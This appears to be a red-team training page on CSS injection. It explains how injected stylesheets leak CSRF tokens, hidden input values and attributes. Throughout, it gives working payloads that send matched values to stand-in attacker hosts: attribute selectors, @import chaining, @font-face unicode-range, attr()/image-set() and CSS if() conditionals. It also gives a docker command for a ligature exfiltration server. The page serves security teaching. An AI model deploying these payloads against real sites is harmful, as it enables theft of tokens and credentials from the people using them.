---
layout: training-page
title: "CSS Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - css-injection
  - data-exfiltration
  - csrf-bypass
  - blind-css
page_key: "web-css-injection"
render_with_liquid: false
---

# CSS Injection

CSS Injection occurs when an application allows untrusted CSS to be injected into a web page. Because CSS is often permitted by Content Security Policy rules that block JavaScript, this technique is used to exfiltrate sensitive data — such as CSRF tokens, hidden input values, or attribute contents — by triggering network requests based on element attributes and selector matches.

## Tools

- **blind-css-exfiltration** — Exfiltrate unknown web pages using Blind CSS — `github.com/hackvertor/blind-css-exfiltration`
- **css-exfiltration** — PortSwigger collection of CSS exfiltration techniques — `github.com/PortSwigger/css-exfiltration`
- **css-scrollbar-attack** — PoC for leaking text nodes via CSS injection using scrollbars — `github.com/cgvwzq/css-scrollbar-attack`
- **sic** — Sequential Import Chaining for advanced CSS exfiltration — `github.com/d0nutptr/sic`
- **fontleak** — Fast exfiltration of text using CSS and Ligatures — `github.com/adrgs/fontleak`

## CSS Selector Exfiltration

CSS attribute selectors match elements based on their attribute values. When a selector matches, the browser loads any referenced background image — including an attacker-controlled URL — leaking the matched value. This technique brute-forces a secret character by character.

Selector types:

- `input[value^=a]` — prefix match (value starts with "a")
- `input[value$=a]` — suffix match (value ends with "a")
- `input[value*=a]` — substring match (value contains "a")

Basic exfiltration via background image:

```
input[value^="TOKEN_012"] {
  background-image: url(http://attacker.example.com/?prefix=TOKEN_012);
}

input[name="pin"][value="1234"] {
  background: url(https://attacker.com/log?pin=1234);
}
```

### Hidden Input Fields

You cannot apply a background image to a hidden input directly. Use a sibling selector to style a visible element after the hidden input:

```
input[name="csrf-token"][value^="a"] + input {
  background: url(https://attacker.com?q=a)
}
```

### :has() Pseudo-class

The `:has()` pseudo-class styles a parent element based on its children, allowing exfiltration from parent context:

```
div:has(input[value="1337"]) {
  background:url(/collectData?value=1337);
}
```

## CSS Import Exfiltration (Blind CSS)

The `@import` rule imports external stylesheets. An attacker-controlled server can respond with crafted CSS that triggers selector-based callbacks. Because `@import` supports long-polling, frames do not need to reload — the browser processes the import and applies new styles dynamically.

```
<style>@import url(http://attacker.com/staging?len=32);</style>
<style>@import'//YOUR-PAYLOAD.oastify.com'</style>
```

### Sequential Import Chaining (SIC)

SIC chains multiple extraction steps without reloading the page:

1. Inject an initial `@import` rule pointing to a staging payload on the attacker server.
2. The staging server holds the connection open (long-polling) while generating the next payload.
3. When a CSS rule matches (a character is found via `background-image`), the browser makes a request.
4. The server detects this and generates the next `@import` rule to continue the chain.

## CSS Font-face Unicode Range Attack

The `@font-face` at-rule with `unicode-range` causes the browser to fetch a specific font only if a matching character is present on the page. By assigning unique URLs to each character, an attacker can detect which characters exist in a target element.

```
<style>
@font-face{ font-family:poc; src: url(http://attacker.example.com/?A); unicode-range:U+0041; }
@font-face{ font-family:poc; src: url(http://attacker.example.com/?B); unicode-range:U+0042; }
@font-face{ font-family:poc; src: url(http://attacker.example.com/?C); unicode-range:U+0043; }
#sensitive-information{ font-family:poc; }
</style>
<p id="sensitive-information">AB</p>
```

**Limitations:** Cannot distinguish repeated characters (e.g., "AA" triggers one request). Does not reveal order of characters. Despite this, it is a reliable oracle for character existence. Chrome marked this "WontFix" (issue 40083029).

## Attribute Extraction via attr()

The CSS `attr()` function retrieves an element's attribute value. With recent updates to `attr()` (Advanced attr in Chrome), it can be combined with `image-set()` to extract input values cross-origin. When the stylesheet is hosted on the attacker's server, relative URLs resolve against the attacker's origin — leaking the attribute value as a path request.

Target HTML:

```
<input type="text" name="password" value="supersecret">
```

Attacker's `index.css`:

```
input[name="password"] {
  background: image-set(attr(value))
}
```

Resulting request on attacker's server:

```
GET /supersecret HTTP/1.1
```

## Ligature-based Exfiltration

A ligature combines multiple characters into a single wide glyph. By crafting a custom font where specific character sequences produce ligatures with extreme widths, an attacker can detect the presence of target strings through layout changes detected via media queries or scrollbar width differences.

```
docker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 ghcr.io/adrgs/fontleak:latest
```

Payload using `fontleak` with a custom selector and alphabet. The CSS selector must match exactly one element on the target page:

{% raw %}

```
<style>@import url("http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789");</style>
```

{% endraw %}

## CSS Conditionals (Inline Style Exfiltration)

This advanced technique uses CSS `if()` conditionals and custom properties to perform logic within a style attribute — without any JavaScript. The example below steals a `data-uid` attribute if it matches a value between 1 and 10:

{% raw %}

```
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3)))); background: image-set(var(--steal));' data-uid='1'></div>
```

{% endraw %}

## Resources

- blind-css-exfiltration — `github.com/hackvertor/blind-css-exfiltration`
- fontleak — `github.com/adrgs/fontleak`
- Sequential Import Chaining (sic) — `github.com/d0nutptr/sic`
- CSS Injection (xsleaks.dev) — `xsleaks.dev/docs/attacks/css-injection/`
- Blind CSS Exfiltration — Gareth Heyes, PortSwigger Research
- CSS based Attack: Abusing unicode-range of @font-face — Masato Kinugawa
